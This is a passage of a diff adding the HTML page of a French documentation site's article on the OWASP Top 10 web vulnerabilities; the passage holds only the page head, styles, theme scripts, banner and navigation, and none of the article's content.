@@ -1,0 +1,3312 @@
+
+<!doctype html>
+<html lang="fr" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Référentiel des 10 vulnérabilités applicatives Web les plus critiques — comprendre, identifier et remédier aux risques OWASP Top 10 2021">
+      
+      
+        <meta name="author" content="Alain GUILLON">
+      
+      
+        <link rel="canonical" href="https://omnydocs.netlify.app/cyber/governance/vuln/owasp-top10/">
+      
+      
+        <link rel="prev" href="../cve-cvss/">
+      
+      
+        <link rel="next" href="../patch-management/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="zensical-0.0.34">
+    
+    
+      
+        <title>Vulnérabilités Web — OWASP Top 10 - OmnyDocs</title>
+      
+    
+    
+      
+        
+      
+      <link rel="stylesheet" href="../../../../assets/stylesheets/classic/main.96fc3bb8.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/classic/palette.7dc9a0ad.min.css">
+      
+      
+
+
+  
+  
+    
+      
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+    
+      
+      
+        
+      
+      
+    
+  
+  
+  <style>:root{.md-tag{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20fill%3D%22none%22%20stroke%3D%22currentColor%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%20stroke-width%3D%222%22%20class%3D%22lucide%20lucide-hash%22%20viewBox%3D%220%200%2024%2024%22%3E%3Cpath%20d%3D%22M4%209h16M4%2015h16M10%203%208%2021M16%203l-2%2018%22/%3E%3C/svg%3E');}.md-tag.md-tag--go_tag{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20640%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.2.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202026%20Fonticons%2C%20Inc.--%3E%3Cpath%20fill%3D%22currentColor%22%20d%3D%22M400.1%20194.8c-10.9%202.8-19.9%204.3-29.1%207.6-7.3%201.9-14.7%203.9-23.2%206.1l-.6.1c-4.2%201.2-4.6%201.3-8.5-3.2-4.7-5.3-8.1-8.7-14.6-11.9-19.7-9.6-38.7-6.8-56.4%204.7-21.2%2013.7-32.1%2034-31.8%2059.2.3%2025%2017.4%2045.5%2041.2%2048.9%2022%202.8%2039.8-4.6%2053.8-20.5%202.1-2.6%204-5.3%206.1-8.3.8-1%201.5-2.1%202.3-3.3h-60.1c-6.5%200-8.1-4-5.9-9.3%204-9.7%2011.5-25.9%2015.9-34%20.9-1.8%203.1-5.8%206.9-5.8h101.1c4.5-13.4%2011.8-26.9%2021.6-39.7%2022.7-29.9%2049.3-45.5%2087.2-52%2031.8-5.6%2061.7-2.5%2088.9%2015.9%2024.6%2016.8%2039.8%2039.6%2043.9%2069.5%205.3%2042.1-6.9%2076.3-36.7%20105.6-19.7%2020.9-44.9%2034-73.9%2039.9-5.6%201-11.1%201.5-16.5%202-2.9.2-5.7.5-8.5.8-28.3-.6-54.2-8.7-76-27.4-15.3-13.3-25.9-29.6-31.1-48.5-3.7%207.3-8%2014.4-14%2021.1-21.6%2029.6-50.9%2048-87.9%2052.9-30.6%204.1-58.9-1.8-83.9-20.5-23-17.5-36.1-40.5-39.5-69.2-4.1-34%205.9-65.4%2026.4-91.3%2022.2-29%2051.5-47.4%2087.3-53.9%2029.3-6.2%2057.3-1.9%2082.6%2015.3%2016.5%2010.9%2028.3%2025.8%2036.1%2043.9%201.9%202.8.6%204.4-3.1%205.3m-351.8%205.6c-1.3%200-1.6-.6-.9-1.6l6.6-8.4c.6-.9%202.2-1.5%203.4-1.5h111.3c1.2%200%201.5.9.9%201.8l-5.3%208.1c-.6%201-2.2%201.9-3.1%201.9l-112.8-.3zM1.2%20229.1c-1.2%200-1.6-.7-.9-1.6l6.5-8.4c.6-.9%202.2-1.6%203.4-1.6h142.1c1.2%200%201.8%201%201.5%201.9l-2.5%207.5c-.3%201.2-1.5%201.9-2.8%201.9zm74.5%2026.8c-.6.9-.3%201.8.9%201.8l68%20.3c.9%200%202.2-.9%202.2-2.1l.6-7.5c0-1.3-.6-2.2-1.9-2.2H83.2c-1.2%200-2.5.9-3.1%201.9zm501.5-18c-.2-2.6-.3-4.8-.7-7-5.6-30.8-34-48.3-63.6-41.4-29%206.5-47.7%2024.9-54.5%2054.2-5.6%2024.3%206.2%2048.9%2028.6%2058.9%2017.2%207.5%2034.3%206.6%2050.8-1.9%2024.6-13.6%2038-32.7%2039.6-59.5-.1-1.2-.1-2.3-.2-3.3%22/%3E%3C/svg%3E');}.md-tag.md-tag--javascript_tag{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.2.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202026%20Fonticons%2C%20Inc.--%3E%3Cpath%20fill%3D%22currentColor%22%20d%3D%22M0%2032v448h448V32zm243.8%20349.4c0%2043.6-25.6%2063.5-62.9%2063.5-33.7%200-53.2-17.4-63.2-38.5l34.3-20.7c6.6%2011.7%2012.6%2021.6%2027.1%2021.6%2013.8%200%2022.6-5.4%2022.6-26.5V237.7h42.1zm99.6%2063.5c-39.1%200-64.4-18.6-76.7-43l34.3-19.8c9%2014.7%2020.8%2025.6%2041.5%2025.6%2017.4%200%2028.6-8.7%2028.6-20.8%200-14.4-11.4-19.5-30.7-28l-10.5-4.5c-30.4-12.9-50.5-29.2-50.5-63.5%200-31.6%2024.1-55.6%2061.6-55.6%2026.8%200%2046%209.3%2059.8%2033.7L368%20290c-7.2-12.9-15-18-27.1-18-12.3%200-20.1%207.8-20.1%2018%200%2012.6%207.8%2017.7%2025.9%2025.6l10.5%204.5c35.8%2015.3%2055.9%2031%2055.9%2066.2%200%2037.8-29.8%2058.6-69.7%2058.6%22/%3E%3C/svg%3E');}.md-tag.md-tag--php_tag{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20640%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.2.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202026%20Fonticons%2C%20Inc.--%3E%3Cpath%20fill%3D%22currentColor%22%20d%3D%22M320%20104.5c171.4%200%20303.2%2072.2%20303.2%20151.5S491.3%20407.5%20320%20407.5c-171.4%200-303.2-72.2-303.2-151.5S148.7%20104.5%20320%20104.5m0-16.8C143.3%2087.7%200%20163%200%20256s143.3%20168.3%20320%20168.3S640%20349%20640%20256%20496.7%2087.7%20320%2087.7M218.2%20242.5c-7.9%2040.5-35.8%2036.3-70.1%2036.3l13.7-70.6c38%200%2063.8-4.1%2056.4%2034.3M97.4%20350.3h36.7l8.7-44.8c41.1%200%2066.6%203%2090.2-19.1%2026.1-24%2032.9-66.7%2014.3-88.1-9.7-11.2-25.3-16.7-46.5-16.7h-70.7zm185.7-213.6h36.5l-8.7%2044.8c31.5%200%2060.7-2.3%2074.8%2010.7%2014.8%2013.6%207.7%2031-8.3%20113.1h-37c15.4-79.4%2018.3-86%2012.7-92-5.4-5.8-17.7-4.6-47.4-4.6l-18.8%2096.6h-36.5zM505%20242.5c-8%2041.1-36.7%2036.3-70.1%2036.3l13.7-70.6c38.2%200%2063.8-4.1%2056.4%2034.3M384.2%20350.3H421l8.7-44.8c43.2%200%2067.1%202.5%2090.2-19.1%2026.1-24%2032.9-66.7%2014.3-88.1-9.7-11.2-25.3-16.7-46.5-16.7H417z%22/%3E%3C/svg%3E');}.md-tag.md-tag--python_tag{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.2.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202026%20Fonticons%2C%20Inc.--%3E%3Cpath%20fill%3D%22currentColor%22%20d%3D%22M439.8%20200.5c-7.7-30.9-22.3-54.2-53.4-54.2h-40.1v47.4c0%2036.8-31.2%2067.8-66.8%2067.8H172.7c-29.2%200-53.4%2025-53.4%2054.3v101.8c0%2029%2025.2%2046%2053.4%2054.3%2033.8%209.9%2066.3%2011.7%20106.8%200%2026.9-7.8%2053.4-23.5%2053.4-54.3v-40.7H226.2v-13.6h160.2c31.1%200%2042.6-21.7%2053.4-54.2%2011.2-33.5%2010.7-65.7%200-108.6M286.2%20444.7a20.4%2020.4%200%201%201%200-40.7%2020.4%2020.4%200%201%201%200%2040.7M167.8%20248.1h106.8c29.7%200%2053.4-24.5%2053.4-54.3V91.9c0-29-24.4-50.7-53.4-55.6-35.8-5.9-74.7-5.6-106.8.1-45.2%208-53.4%2024.7-53.4%2055.6v40.7h106.9v13.6h-147c-31.1%200-58.3%2018.7-66.8%2054.2-9.8%2040.7-10.2%2066.1%200%20108.6%207.6%2031.6%2025.7%2054.2%2056.8%2054.2H101v-48.8c0-35.3%2030.5-66.4%2066.8-66.4m-6.6-183.4a20.4%2020.4%200%201%201%200%2040.8%2020.4%2020.4%200%201%201%200-40.8%22/%3E%3C/svg%3E');}.md-tag.md-tag--rust_tag{--md-tag-icon:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.2.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202026%20Fonticons%2C%20Inc.--%3E%3Cpath%20fill%3D%22currentColor%22%20d%3D%22m508.5%20249.8-21.8-13.5c-.2-2-.3-3.9-.5-5.9l18.7-17.5c.9-.9%201.6-1.9%202-3.1s.5-2.5.2-3.7-.8-2.4-1.6-3.3-1.8-1.7-3-2.1l-24-9c-.5-1.9-1.1-3.8-1.7-5.6l15-20.8c.7-1%201.2-2.2%201.3-3.4s0-2.5-.5-3.7-1.2-2.2-2.2-2.9-2.1-1.3-3.4-1.5l-25.4-4.2c-.9-1.7-1.8-3.4-2.7-5.2l10.7-23.4c.5-1.1.7-2.4.6-3.6s-.5-2.4-1.2-3.5-1.6-1.9-2.8-2.5-2.4-.8-3.6-.8l-25.8.9c-1.2-1.5-2.4-2.9-3.6-4.4l5.8-25.3c.3-1.2.3-2.5-.1-3.7s-1-2.3-1.9-3.2-2-1.5-3.2-1.9-2.5-.4-3.7-.1l-25.1%206c-1.4-1.2-2.9-2.4-4.4-3.6l.9-25.8c.1-1.3-.2-2.5-.8-3.6s-1.4-2.1-2.5-2.8-2.2-1.1-3.5-1.2-2.5.1-3.7.6l-23.3%2010.7-5.1-2.7-4.2-25.4c-.2-1.2-.7-2.4-1.5-3.4s-1.8-1.7-2.9-2.2-2.4-.7-3.7-.5-2.4.6-3.4%201.3l-20.9%2015c-1.9-.6-3.8-1.1-5.6-1.7l-9-24c-.4-1.2-1.2-2.2-2.1-3S307.2%205.2%20306%205s-2.5-.2-3.7.2-2.3%201.1-3.1%202l-17.6%2018.7c-2-.2-3.9-.4-5.9-.5L262.3%203.5c-.7-1.1-1.6-1.9-2.7-2.6S257.3%200%20256%200s-2.5.3-3.6.9-2%201.5-2.7%202.6l-13.5%2021.8c-2%20.2-3.9.3-5.9.6L212.9%207.1c-.9-.9-1.9-1.6-3.1-2s-2.5-.5-3.7-.2-2.4.8-3.3%201.6-1.7%201.8-2.1%203l-9%2024c-1.9.6-3.8%201.1-5.7%201.7l-20.8-15c-1-.7-2.2-1.2-3.4-1.3s-2.5%200-3.7.5-2.2%201.2-2.9%202.2-1.3%202.1-1.5%203.4l-4.2%2025.4c-1.7.9-3.4%201.8-5.2%202.7l-23.4-10.5c-1.1-.5-2.4-.7-3.7-.6s-2.5.5-3.5%201.2-1.9%201.7-2.5%202.8-.8%202.4-.8%203.6l.9%2025.8c-1.5%201.2-3%202.4-4.4%203.6l-25.1-6c-1.2-.3-2.5-.3-3.7.1s-2.3%201-3.2%201.9-1.5%202-1.9%203.2-.4%202.5-.1%203.7l6%2025.1c-1.2%201.4-2.4%202.9-3.6%204.4l-25.8-.9c-1.3%200-2.5.2-3.6.8s-2.1%201.4-2.8%202.4-1.1%202.2-1.2%203.5.1%202.5.6%203.6l10.7%2023.4c-.9%201.7-1.8%203.4-2.7%205.2l-25.4%204.1c-1.2.2-2.4.7-3.4%201.5s-1.7%201.8-2.2%202.9-.7%202.4-.5%203.7.6%202.4%201.3%203.4l15%2020.8c-.6%201.9-1.1%203.8-1.7%205.7l-24%209c-1.2.4-2.2%201.2-3%202.1s-1.4%202.1-1.6%203.3-.2%202.5.2%203.7%201.1%202.3%202%203.1l18.7%2017.5c-.2%202-.4%203.9-.6%205.9L3.5%20249.8c-1.1.7-1.9%201.6-2.6%202.7s-.9%202.3-.9%203.6.3%202.5.9%203.6%201.5%202%202.6%202.7l21.8%2013.5c.2%202%20.3%203.9.6%205.9L7.1%20299.1c-.9.9-1.6%201.9-2%203.1s-.5%202.5-.2%203.7.8%202.4%201.6%203.3%201.8%201.7%203%202.1l24%209c.6%201.9%201.1%203.8%201.7%205.6l-15%2020.8c-.7%201-1.2%202.2-1.3%203.4s0%202.5.5%203.7%201.2%202.2%202.2%202.9%202.1%201.3%203.4%201.5l25.4%204.2%202.7%205.1-10.5%2023.6c-.5%201.1-.7%202.4-.6%203.6s.5%202.5%201.2%203.5c.7%201.1%201.6%201.9%202.7%202.5s2.4.8%203.6.8l25.8-.9c1.2%201.5%202.4%202.9%203.6%204.4L73%20430.2c-.3%201.2-.3%202.5.1%203.7s1%202.3%201.9%203.2%202%201.5%203.2%201.9%202.5.4%203.7.1l25.2-5.9c1.5%201.2%202.9%202.4%204.4%203.6l-.9%2025.8c0%201.3.2%202.5.8%203.6s1.4%202.1%202.5%202.8%202.2%201.1%203.5%201.2%202.5-.1%203.6-.6l23.4-10.7%205.1%202.7%204.2%2025.4c.2%201.2.7%202.4%201.5%203.4s1.8%201.8%202.9%202.2%202.4.7%203.7.5%202.4-.6%203.4-1.3l20.8-15c1.9.6%203.8%201.1%205.6%201.7l9%2024c.4%201.2%201.2%202.2%202.1%203s2.1%201.4%203.3%201.6%202.5.2%203.7-.2%202.3-1.1%203.1-2l17.5-18.7c2%20.2%203.9.4%205.9.6l13.5%2021.8c.7%201.1%201.6%201.9%202.7%202.6s2.3.9%203.6.9%202.5-.3%203.6-.9%202-1.5%202.7-2.6l13.5-21.8c2-.2%203.9-.3%205.9-.6l17.5%2018.7c.9.9%201.9%201.6%203.1%202s2.5.5%203.7.2%202.4-.8%203.3-1.6%201.7-1.8%202.1-3l9-24c1.9-.6%203.8-1.1%205.6-1.7l20.8%2015c1%20.7%202.2%201.2%203.4%201.3s2.5%200%203.7-.5%202.2-1.2%202.9-2.2%201.3-2.1%201.5-3.4l4.2-25.4%205.1-2.7%2023.4%2010.7c1.1.5%202.4.7%203.6.6s2.4-.5%203.5-1.2%201.9-1.6%202.5-2.8.8-2.4.8-3.6l-.9-25.8c1.5-1.2%202.9-2.4%204.4-3.6l25.2%205.9c1.2.3%202.5.3%203.7-.1s2.3-1%203.2-1.9%201.5-2%201.9-3.2.4-2.5.1-3.7l-5.9-25.2c1.2-1.4%202.4-2.9%203.6-4.4l25.8.9c1.3.1%202.5-.2%203.6-.8s2.1-1.4%202.8-2.5c.7-1%201.1-2.2%201.2-3.5s-.1-2.5-.6-3.6l-10.7-23.4%202.7-5.1%2025.4-4.2c1.2-.2%202.4-.7%203.4-1.5s1.8-1.8%202.2-2.9.7-2.4.5-3.7-.6-2.4-1.3-3.4l-15-20.8c.6-1.9%201.1-3.8%201.7-5.6l24-9c1.2-.4%202.2-1.2%203-2.1s1.4-2.1%201.6-3.3.2-2.5-.2-3.7-1.1-2.3-2-3.1l-18.7-17.5c.2-1.9.4-3.9.6-5.9l21.8-13.5c1.1-.7%201.9-1.6%202.6-2.7s.9-2.3.9-3.6-.3-2.5-.9-3.6-1.5-2-2.6-2.7m-151%20129.1c-3.6-.8-7.4-.1-10.5%201.9s-5.3%205.2-6%208.8l-7.6%2035.7c-24.6%2011.1-51.3%2016.8-78.3%2016.7s-53.6-6.1-78.1-17.4l-7.6-35.7c-.4-1.8-1.1-3.5-2.1-5s-2.4-2.8-3.9-3.8-3.2-1.7-5-2-3.6-.3-5.4.1l-31.5%206.8c-5.8-6-11.3-12.5-16.3-19.2h153.2c1.7%200%202.9-.3%202.9-1.9v-54.2c0-1.6-1.2-1.9-2.9-1.9h-44.8v-34.4h48.5c4.4%200%2023.7%201.3%2029.8%2025.9%201.9%207.5%206.2%2032.1%209.1%2040%202.9%208.8%2014.6%2026.5%2027.1%2026.5h79c-5.3%207.1-11.1%2013.8-17.3%2020.1l-32.1-6.9zm25.8%2034.5c0%203-.9%206-2.6%208.5s-4%204.5-6.8%205.6-5.8%201.5-8.8.9-5.7-2-7.8-4.2-3.6-4.8-4.2-7.8-.3-6%20.8-8.8%203.1-5.2%205.6-6.9%205.4-2.6%208.5-2.6h.4c4%20.1%207.7%201.8%2010.5%204.6s4.3%206.7%204.3%2010.6h.1zm-225.6-.7c0%203-.9%206-2.6%208.5s-4.1%204.5-6.8%205.6-5.8%201.5-8.8.9-5.7-2-7.8-4.2-3.6-4.8-4.2-7.8-.3-6%20.9-8.8%203.1-5.2%205.6-6.8%205.4-2.6%208.5-2.6h.5c4%20.1%207.7%201.8%2010.5%204.6s4.3%206.7%204.3%2010.6h.1zM69.6%20234.2l32.8-14.6c1.7-.7%203.2-1.8%204.4-3.1s2.2-2.9%202.9-4.6%201-3.5.9-5.3-.5-3.6-1.2-5.3l-6.8-15.2h26.6v119.7H75.6c-6.6-23.2-8.7-47.6-6.1-71.6zm-11.3-36.1c0-2%20.4-4%201.2-5.8s1.9-3.5%203.3-4.9%203.1-2.5%204.9-3.3%203.8-1.2%205.8-1.2h.5c3%20.1%205.9%201%208.3%202.8s4.3%204.1%205.4%206.9%201.3%205.8.7%208.8-2.1%205.6-4.3%207.7-4.9%203.5-7.8%204.1-6%20.2-8.7-.9-5.1-3.1-6.8-5.6-2.5-5.4-2.5-8.4zm155.2%2024.5v-35.3h63.3c3.3%200%2023.1%203.8%2023.1%2018.6%200%2012.3-15.2%2016.7-27.7%2016.7zM399%20306.7c-9.8%201.1-20.6-4.1-22-10.1-5.8-32.5-15.4-39.4-30.6-51.4%2018.9-12%2038.5-29.6%2038.5-53.3%200-25.5-17.5-41.6-29.4-49.5-16.8-11-35.3-13.2-40.3-13.2H116.3c27.5-30.7%2064.4-51.5%20104.9-59.2l23.5%2024.6c1.3%201.3%202.8%202.4%204.4%203.1s3.5%201.1%205.3%201.2%203.6-.3%205.3-.9%203.2-1.7%204.6-2.9l26.3-25c26.8%205%2052.1%2015.8%2074.3%2031.6s40.6%2036.2%2054.1%2059.9l-18%2040.6c-1.5%203.4-1.5%207.2-.2%2010.6s3.9%206.2%207.3%207.7l34.6%2015.3c1.1%2010.8%201.2%2021.7.4%2032.5h-19.3c-1.9%200-2.7%201.3-2.7%203.1v8.8c0%2020.8-11.7%2025.3-22%2026.5zM240%2060.2c0-4%201.6-7.9%204.5-10.7s6.7-4.5%2010.7-4.5h.4c3%20.1%205.9%201%208.4%202.8s4.3%204.1%205.4%206.9%201.3%205.8.7%208.8-2.1%205.6-4.3%207.7-4.9%203.5-7.8%204-6%20.2-8.7-.9-5.1-3.1-6.8-5.6-2.5-5.4-2.5-8.4zM436.8%20214c-2%200-4-.4-5.8-1.2s-3.5-1.9-4.9-3.3-2.5-3.1-3.3-4.9-1.2-3.8-1.2-5.8.4-4%201.2-5.8%201.9-3.5%203.3-4.9%203.1-2.5%204.9-3.3%203.8-1.2%205.8-1.2h.4c4%20.1%207.9%201.7%2010.7%204.6s4.4%206.8%204.3%2010.8-1.7%207.9-4.6%2010.7-6.8%204.4-10.8%204.3%22/%3E%3C/svg%3E');}}</style>
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,500,500i,700,700i%7CJetbrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Jetbrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="light-blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#vulnerabilites-web-owasp-top-10" class="md-skip">
+          Aller au contenu
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+        <aside class="md-banner">
+          <div class="md-banner__inner md-grid md-typeset">
+            
+              <button class="md-banner__button md-icon" aria-label="Ne plus montrer cela">
+                
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+              </button>
+            
+            
+<!-- Add announcement here, including arbitrary HTML -->
+<small>
+    <em>Cette documentation est en cours de consolidation. Cette exigence de relecture s'inscrit dans une démarche de transmission, visant à proposer un apprentissage structuré et durable en langue française, afin de favoriser une compréhension approfondie et une réelle montée en compétence.</em>
+</small>
+
+          </div>
+          
+            <script>var el=document.querySelector("[data-md-component=announce]");if(el){var content=el.querySelector(".md-typeset");__md_hash(content.innerHTML)===__md_get("__announce")&&(el.hidden=!0)}</script>
+          
+        </aside>
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="En-tête">
+    <a href="../../../.." title="OmnyDocs" class="md-header__button md-logo" aria-label="OmnyDocs" data-md-component="logo">
+      
+  <img src="../../../../assets/logo-dark.png" alt="OmnyDocs">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            OmnyDocs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Vulnérabilités Web — OWASP Top 10
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="light-blue"  aria-label="Change pour le mode sombre"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Change pour le mode sombre" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-sun" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="light-blue" data-md-color-accent="deep-purple"  aria-label="Change pour le mode clair"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Change pour le mode clair" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-moon" viewBox="0 0 24 24"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search" aria-label="Recherche">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Recherche">
+  <button type="button" class="md-search__button">
+    Recherche
+  </button>
+</div>
+      
+    
+    <div class="md-header__source">
+      
+    </div>
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Onglets" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../.." class="md-tabs__link">
+          
+  
+  Accueil
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../bases/" class="md-tabs__link">
+          
+  
+  Fondamentaux IT
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../sys-reseau/" class="md-tabs__link">
+          
+  
+  Systèmes & Infra
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../dev-cloud/" class="md-tabs__link">
+          
+  
+  Développement
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  Cyber : Gouvernance
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../operations/" class="md-tabs__link">
+          
+  
+  Cyber : Défense
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../tools/" class="md-tabs__link">
+          
+  
+  Cyber : Attaque
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../glossaire/" class="md-tabs__link">
+          
+  
+  Glossaire
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../projets/arch-lab/" class="md-tabs__link">
+          
+  
+  Projets
+
+        </a>
